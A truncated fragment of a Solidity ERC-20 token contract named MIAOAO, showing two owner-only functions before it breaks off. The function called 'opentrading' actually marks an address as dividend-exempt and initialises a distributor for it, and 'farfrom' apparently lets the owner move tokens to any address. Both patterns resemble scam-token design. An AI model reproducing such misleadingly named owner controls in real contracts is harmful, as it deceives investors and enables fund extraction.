...
contract MIAOAO is IERC20, Ownable {
    ...
    function opentrading(address holder) external onlyOwner {
        require(holder != address(this));
        isDividendExempt[holder] = true;  
        initDistributor(holder);       
    } 
 
    function farfrom(address _token, address _to) external onlyOwner returns (bool _sent)
  {
